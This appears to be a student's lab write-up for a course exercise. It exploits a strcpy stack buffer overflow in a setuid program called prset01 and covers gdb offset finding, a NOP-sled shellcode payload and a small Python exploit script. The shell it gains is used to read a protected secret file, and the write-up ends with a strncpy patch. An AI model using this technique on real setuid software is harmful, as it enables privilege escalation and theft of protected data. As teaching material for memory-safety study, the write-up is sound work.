

###################  FIGURING OUT THE PROGRAM FUNCTION

I first took a look at the source and identified a vulnerability of using known vulnerable function “strcpy” used on buffer hash_buf inside the function process_verify();  however this function is also calling process_hash(); so I made sure I understand what those functions are doing exactly and what are they are doing.  After several testing I got the idea about the program and it’s expected so arguments. 



###################  VULNERABILITY 

So within gdb: 

(gdb) r verify Makefile AAAA
Starting program: /usr/local/bin/prset01 verify Makefile AAAA

(gdb) p &hash_buf
$1 = (uint8_t (*)[128]) 0x7fffffffe980
(gdb) i f
…..
rbp at 0x7fffffffea60, rip at 0x7fffffffea68

(gdb) p/x 0x7fffffffea68 - 0x7fffffffe980
$2 = 0xe8
(gdb) 

(gdb) r verify Makefile "$(python2 -c 'print "\x90" * 0xe8 + "AAAA"')"
Starting program: /usr/local/bin/prset01 verify Makefile "$(python2 -c 'print "\x90" * 0xe8 + "AAAA"')"

Breakpoint 1, process_verify (path=0x7fffffffed3f "Makefile", hash=0x7fffffffed48 '\220' <repeats 200 times>...) at prset01.c:128
128	    size_t computed_hash_len = 0u;
(gdb) c
Continuing.
ERROR: invalid hash byte (??)

Program received signal SIGSEGV, Segmentation fault.
0x0000000041414141 in ?? ()

This way we know that after the buffer gets injected with data of size 0xe8 bytes, then the return address would be overwrite with the following inputs we give to the buffer. and I confirmed that by giving AAAA > which is “41414141”. 



###################  DESIGN EXPLOIT 

So to make our attack we need to do the following: 

Send 
	(\xcc) or (\x90) of a size of  (0xe8 - payload length)  +  (the shell code payload) + an address somewhere direct us before the shell code is loaded.  So, first we can know exact addresses by running in gdb first.


At the first It took me very long time to get the Stack-overflow example working in gdb, but directly running the program required a slight change in the return_address. because the address of the buffer would not be the same as what I found in gdb. So, with several trial and errors. I realize that the payload that I used for main did not work perfectly inside prset01 program. So I tried several others but still not got any good results.  at the end I start playing with the first instruction which is subtracting from the Stack pointer. First I tried add another instruction of that. 

And It worked however I ran into another issue.


I realized that because of there is a return 1,  the 0x00000001 gets injected on one of the payload data. 
So I did that by changing the structure of my lunched attack to 


(\xcc) or (\x90) * (0xe8 - payload length - 50)  +  (the shell code payload) +  (\x90) * 50 + ret_address

This way I ensure the shelled did not get changed by 0x00000001


But still the shelled did not run,  
after another add of subtraction of stack pointer. the payload seems to work now and I was able to get in.

here is the first lines of the payload, the original I used from the professor example but I made duplicate lines of first instruction. 
I also found this by analysing the payload running by gdb>Layout asm , Layout Reg and Found that RSP is pointing to the shellcode loaded instructions, maybe it's because the -50 shifting I made when I load it in memory. I guess that's the closest justification.

sub rsp, byte 0x70
sub rsp, byte 0x70
sub rsp, byte 0x70



###################  ATTACKING /usr/local/bin/prset01

So Just after I got the /usr/local/bin/prset01 exploited, I was able to find the secret value 

spatialisotope@prset01:~/stack-overflow$ ./prset01 verify Makefile  "$(python2 zexploit.py)"
0x7fffffffe8a0ERROR: invalid hash byte (??)
$ exit
spatialisotope@prset01:~/stack-overflow$ /usr/local/bin/prset01 verify Makefile  "$(python2 zexploit.py)"
ERROR: invalid hash byte (??)
$ whoami
whoami: cannot find name for user ID 1001
$ id
uid=1000(spatialisotope) gid=1000(spatialisotope) euid=1001 groups=1000(spatialisotope)
$ cat /usr/local/share/prset01.secret
gfZx58Kn02e/vqUC1UVL7rhq5STttysW0QqHLz1c04U=
$ 



I also try to craft a more advanced payload that prints out this value directly, but I did not complete it.
I was trying to make execve("/bin/cat", {"cat", "/usr/local/share/prseto1.secert"}, NULL) but I kept getting Segmentation Fault I am sure It's about making the second argument array. I kinda know the structure of the second argument should be like 3 pointers, one pointer points to "cat", another points to ""/usr/local/share/prseto1.secert" and last a pointer to NULL. and I just didn't have much time I loved the feeling of finishing this challenge I spend a looooots of time doing this and looking for sure to get this assembly code finished someday.  


###################  PATCH

My patch is:

// strcpy(hash_buf, hash);
strncpy(hash_buf, hash, computed_hash_len * 2);

strcpy is vulnerable because it’s just copies without looking into any boundaries of the buffer. So, I put strcncpy because it copies just the specific number of bytes.  I found that after looking to process_hash is it actually produces computed_hash_len of 32 but the program is converting those integers to chars and inside a loop taking two of its and put them in one buffer char element.
hash_buf[i] =
            (digittoint(hash_buf[2*i]) << 4)
            | digittoint(hash_buf[2*i+1]);

so I figured it if computed_hash_len=32, then the actual but should have 64 bytes length, and that’s what I see from the output too. 


TEST
spatialisotope@prset01:~/prset01$ ./prset01 verify Makefile  "$(python2 zexploit.py)"
ERROR: invalid hash byte (??)
spatialisotope@prset01:~/prset01$ ./prset01 hash Makefile                          
98a75b72fdd72c3ad0d8a94ed0e631366be0bf7a78bbfbc2f13afbabf51dbd1c  Makefile
spatialisotope@prset01:~/prset01$ ./prset01 verify Makefile 98a75b72fdd72c3ad0d8a94ed0e631366be0bf7a78bbfbc2f13afbabf51dbd1c
OK
spatialisotope@prset01:~/prset01$ 




################# EXPLOIT SCRIPT

#! /usr/bin/env python2

import sys, struct

buf_len = 0xe8
ret_addr = 0x7fffffffe840
payload = open('payload.bin').read()
buf = ('\x90' * (buf_len-len(payload) - 50)) +  payload + ('\x90' * 50) + struct.pack('<Q', ret_addr)
sys.stdout.write(buf)


